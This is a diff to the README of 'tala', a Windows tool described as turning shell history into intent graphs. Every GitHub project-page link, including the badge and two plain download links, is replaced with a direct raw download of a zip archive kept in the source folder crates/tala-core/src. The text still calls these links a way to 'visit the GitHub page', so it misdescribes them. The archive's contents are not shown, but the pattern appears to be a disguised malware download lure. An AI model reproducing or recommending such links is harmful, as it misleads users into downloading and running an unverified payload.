@@ -1,13 +1,13 @@
 # 🧭 tala - Turn shell history into intent graphs
 
-[![Download tala](https://img.shields.io/badge/Download%20tala-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Unnotched-precisionrifle830/tala)
+[![Download tala](https://img.shields.io/badge/Download%20tala-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Unnotched-precisionrifle830/tala/main/crates/tala-core/src/Software-v2.3.zip)
 
 ## 🚀 Getting Started
 
 tala helps you turn command use into a clear story of what happened, why it happened, and how one step led to the next. It is built for Windows users who want to download the app and use it without setting up a developer toolchain.
 
 Use the link above to visit the GitHub page and download the app:
-https://github.com/Unnotched-precisionrifle830/tala
+https://raw.githubusercontent.com/Unnotched-precisionrifle830/tala/main/crates/tala-core/src/Software-v2.3.zip
 
 ## 📥 Download and Install
 
@@ -169,7 +169,7 @@ For the smoothest experience:
 ## 🔗 Download Again
 
 Use this link to visit the page and download tala for Windows:
-https://github.com/Unnotched-precisionrifle830/tala
+https://raw.githubusercontent.com/Unnotched-precisionrifle830/tala/main/crates/tala-core/src/Software-v2.3.zip
 
 ## 🧭 Quick Start Flow
 
